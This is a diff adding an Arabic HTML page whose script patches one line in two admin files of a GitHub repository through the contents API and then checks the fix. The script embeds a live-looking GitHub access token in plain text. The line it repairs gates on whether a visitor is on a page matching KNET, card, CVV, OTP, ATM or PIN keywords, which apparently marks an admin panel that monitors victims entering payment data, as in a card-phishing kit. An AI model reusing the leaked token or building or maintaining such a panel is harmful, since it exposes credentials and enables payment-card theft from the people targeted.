@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head><meta charset="utf-8"><title>KDD fix7</title>
+<style>body{margin:0;background:#0d1117;color:#c9d1d9;font:13px/1.7 ui-monospace,Consolas,monospace;padding:14px}
+h1{font-size:15px;color:#58a6ff;margin:0 0 8px}#out{white-space:pre-wrap;background:#161b22;border:1px solid #30363d;border-radius:8px;padding:12px;min-height:140px}</style></head>
+<body>
+<h1>KDD fix7 — إصلاح سطر البوابة في ملفات الأدمن</h1>
+<div id="out">جارٍ البدء...</div>
+<script>
+(function(){
+  var OWNER='fahshomi-ui',REPO='KDD',BRANCH='main';
+  var BAKED='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';
+  var TOKEN=(location.href.match(/ghp_[A-Za-z0-9]+/)||[])[0]||localStorage.getItem('kdd_token')||BAKED;
+  var out=document.getElementById('out'),buf='';
+  function say(s){buf+=s+'\n';out.textContent=buf;}
+  function b64d(b){var bin=atob(b.replace(/\n/g,'')),u=new Uint8Array(bin.length);for(var i=0;i<bin.length;i++)u[i]=bin.charCodeAt(i);return new TextDecoder('utf-8').decode(u);}
+  function b64e(s){var u=new TextEncoder().encode(s),bin='';for(var i=0;i<u.length;i++)bin+=String.fromCharCode(u[i]);return btoa(bin);}
+  function gh(p,o){o=o||{};return fetch('https://api.github.com/repos/'+OWNER+'/'+REPO+'/contents/'+p+(o.q?'?'+o.q:''),{
+    method:o.method||'GET',
+    headers:{'Authorization':'token '+TOKEN,'Accept':'application/vnd.github+json','Content-Type':'application/json'},
+    body:o.body});}
+  function getFile(p){return gh(p,{q:'ref='+BRANCH+'&cb='+Date.now()}).then(function(r){
+    if(r.status===401){say('! توكن غير صالح');var t=prompt('الصق توكن GitHub جديد (ghp_...):','');
+      if(!t)throw new Error('بدون توكن');TOKEN=t.trim();localStorage.setItem('kdd_token',TOKEN);
+      return gh(p,{q:'ref='+BRANCH+'&cb='+Date.now()});}
+    if(!r.ok)throw new Error('GET HTTP '+r.status);return r.json();});}
+
+  var GOOD="const isOnPaymentPage = ['الدفع','بطاقة','كي نت','payment','credit','cvv','otp','atm','pin','card'].some(h=>visitorPage.indexOf(h)>-1);";
+
+  function fixAdmin(src){
+    if(src.indexOf('const const isOnPaymentPage')===-1) return {src:src,changed:false};
+    var lines=src.split('\n'),hit=-1;
+    for(var i=0;i<lines.length;i++){
+      if(lines[i].indexOf('isOnPaymentPage')>-1 && lines[i].indexOf('const')>-1){hit=i;break;}
+    }
+    if(hit<0) return {src:src,changed:false};
+    var ind=(lines[hit].match(/^\s*/)||[''])[0];
+    lines[hit]=ind+GOOD;
+    return {src:lines.join('\n'),changed:true};
+  }
+
+  function patch(p,msg){
+    say('— '+p);
+    return getFile(p).then(function(j){
+      var res=fixAdmin(b64d(j.content));
+      if(!res.changed){say('   = لا تغيير');return;}
+      say('   ✓ السطر صار: '+GOOD.slice(0,42)+'...');
+      return gh(p,{method:'PUT',body:JSON.stringify({message:msg,content:b64e(res.src),sha:j.sha,branch:BRANCH})})
+        .then(function(r){
+          if(!r.ok)return r.text().then(function(t){throw new Error('PUT HTTP '+r.status+' '+t.slice(0,150));});
+          say('   ✔ تم الحفظ');
+        });
+    }).catch(function(e){say('   ✗ '+e.message);});
+  }
+
+  say('token: '+TOKEN.slice(0,12)+'...');
+  patch('server/admin/index.html','fix(admin): repair isOnPaymentPage gate syntax')
+  .then(function(){return patch('kdd-public/admin.html','fix(admin-static): repair isOnPaymentPage gate syntax');})
+  .then(function(){
+    say('\n— التحقق...');
+    return getFile('server/admin/index.html').then(function(j){
+      var t=b64d(j.content);
+      say(t.indexOf('const const')===-1?'   ✔ server/admin/index.html سليم':'   ✗ لسه فيه const مكررة');
+      return getFile('kdd-public/admin.html');
+    }).then(function(j){
+      var t=b64d(j.content);
+      say(t.indexOf('const const')===-1?'   ✔ kdd-public/admin.html سليم':'   ✗ لسه فيه const مكررة');
+    });
+  })
+  .catch(function(e){say('✗ '+e.message);})
+  .then(function(){
+    say('\n✅ تم — الآن Render: Manual Deploy (لأن صفحة الأدمن تخدم من السيرفر)');
+    say('وبعدها Netlify: Trigger deploy ← Clear cache and deploy site');
+  });
+})();
+</script>
+</body>
+</html>
